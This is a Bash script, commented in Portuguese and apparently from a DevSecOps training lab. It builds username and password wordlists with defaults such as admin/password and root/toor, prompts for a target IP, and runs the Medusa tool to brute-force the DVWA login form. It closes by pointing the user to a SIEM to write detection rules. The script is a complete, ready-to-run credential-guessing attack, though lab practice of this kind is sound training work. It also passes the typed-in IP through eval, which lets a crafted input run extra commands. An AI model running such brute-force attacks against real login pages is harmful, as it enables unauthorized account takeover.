#!/bin/bash

# --- Configurações ---
USERS_FILE="users_dvwa.txt"
PASS_FILE="pass_dvwa.txt"
DEFAULT_USERS=("admin" "guest" "user" "root" "tester")
DEFAULT_PASSWORDS=("password" "123456" "admin123" "toor" "test")

# --- Funções ---

criar_lista_usuarios() {
    echo "--- 🧑‍💻 Geração da Lista de Usuários ---"
    printf "%s\n" "${DEFAULT_USERS[@]}" > $USERS_FILE
    
    read -p "Deseja adicionar um usuário personalizado? (s/n): " resposta
    if [[ "$resposta" == "s" || "$resposta" == "S" ]]; then
        echo "Digite os usuários (um por linha). Pressione ENTER duas vezes para finalizar."
        while IFS= read -r user; do
            [[ -z "$user" ]] && break
            echo "$user" >> $USERS_FILE
        done
    fi
    echo "[SUCESSO] Lista de usuários salva em $USERS_FILE com $(wc -l < $USERS_FILE) itens."
}

criar_lista_senhas() {
    echo "--- 🔑 Geração da Lista de Senhas ---"
    printf "%s\n" "${DEFAULT_PASSWORDS[@]}" > $PASS_FILE

    read -p "Deseja adicionar uma senha personalizada? (s/n): " resposta
    if [[ "$resposta" == "s" || "$resposta" == "S" ]]; then
        echo "Digite as senhas (um por linha). Pressione ENTER duas vezes para finalizar."
        while IFS= read -r pass; do
            [[ -z "$pass" ]] && break
            echo "$pass" >> $PASS_FILE
        done
    fi
    echo "[SUCESSO] Lista de senhas salva em $PASS_FILE com $(wc -l < $PASS_FILE) itens."
}

executar_medusa() {
    echo "=================================================================="
    echo "📢 ETAPA DE EXECUÇÃO DO MEDUSA (DVWA HTTP FORM) INICIADA 📢"
    echo "=================================================================="

    if ! command -v medusa &> /dev/null
    then
        echo "[ERRO] A ferramenta 'medusa' não foi encontrada."
        exit 1
    fi
    
    # ETAPA NOVA: Solicita o IP ao usuário
    read -p "➡️ Digite o IP do DVWA (ex: 192.168.15.36): " TARGET_IP

    if [[ -z "$TARGET_IP" ]]; then
        echo "[ERRO] IP do alvo não fornecido. Abortando."
        return 1
    fi

    echo "🚀 Executando Força Bruta contra $TARGET_IP..."

    # Comando Medusa usa a variável TARGET_IP
    MEDUSA_COMMAND="medusa -h $TARGET_IP -U $USERS_FILE -P $PASS_FILE -M http \
-m PAGE:'/dvwa/login.php' \
-m FORM:'username=^USER^&password=^PASS^&Login=Login' \
-m 'FAIL=Login failed' -t 6"

    echo "Comando: $MEDUSA_COMMAND"
    echo ""
    
    eval $MEDUSA_COMMAND
    
    echo ""
    echo "✅ FIM da execução do Medusa. Verifique o SIEM para criar regras de detecção."
}

# --- Fluxo Principal ---
main() {
    echo "--- 💻 DevSecOps Lab: Força Bruta DVWA (Bash) ---"
    
    criar_lista_usuarios
    criar_lista_senhas
    
    executar_medusa
    
    echo "--- Limpeza de Arquivos ---"
    rm -f $USERS_FILE $PASS_FILE
    echo "[CONCLUÍDO] Arquivos $USERS_FILE e $PASS_FILE removidos."
}

# Inicia o script
main
